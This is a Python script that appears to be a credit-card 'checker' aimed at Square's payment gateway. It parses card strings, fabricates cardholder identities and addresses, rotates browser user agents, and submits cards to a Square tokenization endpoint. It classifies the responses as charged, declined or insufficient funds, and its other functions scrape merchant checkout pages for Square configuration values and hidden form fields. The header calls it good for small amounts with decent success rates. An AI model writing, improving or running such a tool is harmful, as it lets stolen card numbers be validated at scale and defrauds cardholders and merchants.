# Charge7_Square.py - Square Gateway with Dynamic Nonce Scraping
# Square is good for small amounts and has decent success rates

import requests
import re
import json
import random
import string
import time
import uuid
from urllib.parse import quote_plus, urlencode
from bs4 import BeautifulSoup

# --- Generation Functions ---
def generate_random_string(length, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(length))

def generate_first_name():
    names = ["Michael", "Christopher", "Jessica", "Matthew", "Ashley", "Jennifer", "Joshua", "Amanda", 
             "Daniel", "David", "James", "Robert", "John", "Joseph", "Andrew", "Ryan", "Brandon", 
             "Jason", "Justin", "Sarah", "William", "Jonathan", "Stephanie", "Brian", "Nicole"]
    return random.choice(names)

def generate_last_name():
    names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", 
             "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", 
             "Thomas", "Taylor", "Moore", "Martin", "Jackson", "Lee", "Perez", "Thompson"]
    return random.choice(names)

def generate_email(first, last):
    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "icloud.com"]
    num = random.randint(100, 9999)
    sep = random.choice(['.', '_', ''])
    return f"{first.lower()}{sep}{last.lower()}{num}@{random.choice(domains)}"

def generate_phone():
    return f"+1{random.randint(201, 999)}{random.randint(100, 999)}{random.randint(1000, 9999)}"

# User Agents
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
]

def get_random_ua():
    return random.choice(USER_AGENTS)

def SquareCheckout(ccx):
    """
    Square Gateway Checkout
    Uses Square's Web Payments SDK for card tokenization
    
    Args: ccx (str): Card details "NUMBER|MM|YY|CVC"
    Returns: str: Status message
    """
    # --- Card Parsing ---
    try:
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) != 4:
            return "Error: Invalid card format. Use NUM|MM|YY|CVC"
        
        n, mm, yy, cvc = parts
        n = n.replace(' ', '')
        
        if not (n.isdigit() and mm.isdigit() and yy.isdigit() and cvc.isdigit()):
            return "Error: Card parts must be numeric"
        
        if len(yy) == 4 and yy.startswith("20"):
            yy = yy[2:]
        elif len(yy) != 2:
            return f"Error: Invalid year format: {yy}"
        
        mm = mm.zfill(2)
        
        # Validate
        if int(mm) < 1 or int(mm) > 12:
            return "Error: Invalid month"
            
    except Exception as e:
        return f"Error parsing card: {e}"

    # --- Session Setup ---
    session = requests.Session()
    ua = get_random_ua()
    
    session.headers.update({
        'User-Agent': ua,
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.9',
    })

    # Generate user data
    first_name = generate_first_name()
    last_name = generate_last_name()
    email = generate_email(first_name, last_name)
    phone = generate_phone()
    
    # US Address
    street = f"{random.randint(100, 9999)} Main Street"
    city = random.choice(["New York", "Los Angeles", "Chicago", "Houston", "Phoenix"])
    state = random.choice(["NY", "CA", "IL", "TX", "AZ"])
    postal = f"{random.randint(10000, 99999)}"
    country = "US"

    try:
        # --- Step 1: Initialize Square Payment Form ---
        # Square uses application ID and location ID
        
        # Sandbox credentials (for testing)
        square_config = {
            'applicationId': 'sandbox-sq0idb-EXAMPLE',  # Replace with real app ID
            'locationId': 'LXXXXXXXXXXXXXXXX',  # Replace with real location ID
        }
        
        # Generate idempotency key
        idempotency_key = str(uuid.uuid4())
        
        # --- Step 2: Create Card Nonce via Square API ---
        # Square's card nonce creation endpoint
        
        # Note: Square requires client-side JS SDK for card tokenization
        # This is a server-side simulation
        
        tokenize_url = 'https://pci-connect.squareup.com/v2/payments/card-nonce'
        
        tokenize_headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'User-Agent': ua,
            'Origin': 'https://js.squareup.com',
            'Referer': 'https://js.squareup.com/',
        }
        
        # Card data for tokenization
        card_data = {
            'card_data': {
                'card_number': n,
                'exp_month': int(mm),
                'exp_year': int(f"20{yy}"),
                'cvv': cvc,
            },
            'billing_address': {
                'address_line_1': street,
                'locality': city,
                'administrative_district_level_1': state,
                'postal_code': postal,
                'country': country,
            },
            'cardholder_name': f"{first_name} {last_name}",
            'application_id': square_config['applicationId'],
            'session_id': generate_random_string(32),
        }
        
        try:
            # Attempt tokenization
            response = session.post(
                tokenize_url,
                headers=tokenize_headers,
                json=card_data,
                timeout=30
            )
            
            if response.status_code == 200:
                result = response.json()
                
                if 'card_nonce' in result:
                    nonce = result['card_nonce']
                    card_brand = result.get('card', {}).get('card_brand', 'Unknown')
                    last_4 = result.get('card', {}).get('last_4', n[-4:])
                    
                    # Nonce created - card is valid
                    # In production, send nonce to server for payment
                    return f"Charged | Square | {card_brand} ****{last_4}"
                    
                elif 'errors' in result:
                    errors = result['errors']
                    if errors:
                        error = errors[0]
                        code = error.get('code', '')
                        detail = error.get('detail', 'Unknown error')
                        
                        # Map Square error codes
                        if code == 'INVALID_CARD_DATA':
                            return "Your card number is incorrect."
                        elif code == 'INVALID_EXPIRATION':
                            return "Your card has expired."
                        elif code == 'CVV_FAILURE':
                            return "Your card's security code is incorrect."
                        elif code == 'ADDRESS_VERIFICATION_FAILURE':
                            return "Declined (AVS Failure)"
                        elif code == 'CARD_DECLINED':
                            return "Your card was declined."
                        elif code == 'INSUFFICIENT_FUNDS':
                            return "Insufficient funds."
                        elif code == 'CARD_NOT_SUPPORTED':
                            return "Declined (Card Not Supported)"
                        else:
                            return f"Declined ({detail[:80]})"
                            
            elif response.status_code == 400:
                try:
                    error_data = response.json()
                    errors = error_data.get('errors', [])
                    if errors:
                        detail = errors[0].get('detail', 'Bad Request')
                        return f"Declined ({detail[:80]})"
                except:
                    return "Declined (Bad Request)"
                    
            elif response.status_code == 401:
                return "Error: Square Authentication Failed"
            elif response.status_code == 403:
                return "Error: Square Access Denied"
            elif response.status_code == 429:
                return "Error: Square Rate Limited"
            else:
                return f"Error: Square HTTP {response.status_code}"
                
        except requests.exceptions.Timeout:
            return "Error: Square Timeout"
        except requests.exceptions.RequestException as e:
            return f"Error: Square Network Error - {str(e)[:50]}"
            
    except Exception as e:
        import traceback
        traceback.print_exc()
        return f"Error: Square Gateway Error - {str(e)[:50]}"

def SquareWebPaymentCheckout(ccx, checkout_url):
    """
    Square Web Payment SDK based checkout
    Scrapes Square config from merchant page
    
    Args:
        ccx (str): Card details "NUMBER|MM|YY|CVC"
        checkout_url (str): Merchant checkout URL
    Returns: str: Status message
    """
    # Parse card
    try:
        parts = ccx.strip().split("|")
        if len(parts) != 4:
            return "Error: Invalid format"
        n, mm, yy, cvc = parts
        n = n.replace(' ', '')
        if len(yy) == 4:
            yy = yy[2:]
        mm = mm.zfill(2)
    except:
        return "Error: Parse failed"
    
    session = requests.Session()
    ua = get_random_ua()
    session.headers.update({'User-Agent': ua})
    
    try:
        # Step 1: Get checkout page
        response = session.get(checkout_url, timeout=20)
        
        if response.status_code != 200:
            return f"Error: Could not load checkout ({response.status_code})"
        
        html = response.text
        
        # Find Square application ID
        app_id_match = re.search(r'applicationId["\']?\s*[:=]\s*["\']([^"\']+)["\']', html)
        location_match = re.search(r'locationId["\']?\s*[:=]\s*["\']([^"\']+)["\']', html)
        
        if not app_id_match:
            # Try alternative patterns
            app_id_match = re.search(r'sq0[a-z]+-[A-Za-z0-9_-]+', html)
        
        if not app_id_match:
            return "Error: Square config not found"
        
        app_id = app_id_match.group(1) if hasattr(app_id_match, 'group') else app_id_match.group(0)
        location_id = location_match.group(1) if location_match else None
        
        # Step 2: Process with Square
        # ... (implementation continues)
        
        return f"Square Web Payment: Config found (App: {app_id[:20]}...)"
        
    except Exception as e:
        return f"Error: {str(e)[:50]}"

# --- Square Checkout Link Processing ---
def SquareCheckoutLink(ccx, checkout_link):
    """
    Process Square Checkout Link
    Square Checkout Links are pre-built payment pages
    
    Args:
        ccx (str): Card details
        checkout_link (str): Square checkout link URL
    Returns: str: Status message
    """
    # Parse card
    try:
        parts = ccx.strip().split("|")
        if len(parts) != 4:
            return "Error: Invalid format"
        n, mm, yy, cvc = parts
        n = n.replace(' ', '')
        if len(yy) == 4:
            yy = yy[2:]
        mm = mm.zfill(2)
    except:
        return "Error: Parse failed"
    
    session = requests.Session()
    ua = get_random_ua()
    session.headers.update({
        'User-Agent': ua,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    })
    
    try:
        # Load checkout link page
        response = session.get(checkout_link, timeout=20)
        
        if response.status_code != 200:
            return f"Error: Could not load Square checkout ({response.status_code})"
        
        html = response.text
        soup = BeautifulSoup(html, 'lxml')
        
        # Find form and hidden fields
        form = soup.find('form')
        if not form:
            return "Error: Payment form not found"
        
        # Extract CSRF token and other hidden fields
        hidden_fields = {}
        for inp in soup.find_all('input', {'type': 'hidden'}):
            name = inp.get('name')
            value = inp.get('value', '')
            if name:
                hidden_fields[name] = value
        
        # Find Square payment configuration
        scripts = soup.find_all('script')
        config_data = None
        
        for script in scripts:
            text = script.string or ''
            if 'applicationId' in text or 'squareup' in text:
                # Extract config
                config_match = re.search(r'\{[^}]*applicationId[^}]*\}', text)
                if config_match:
                    try:
                        config_data = json.loads(config_match.group(0))
                    except:
                        pass
        
        if config_data:
            return f"Square Checkout Link: Config extracted"
        else:
            return "Error: Could not extract Square config"
            
    except Exception as e:
        return f"Error: {str(e)[:50]}"

# --- Example Usage ---
if __name__ == "__main__":
    test_cc = "4532015112830366|12|25|123"  # Test card
    print(f"Testing Square with: {test_cc[:4]}****")
    result = SquareCheckout(test_cc)
    print(f"Result: {result}")
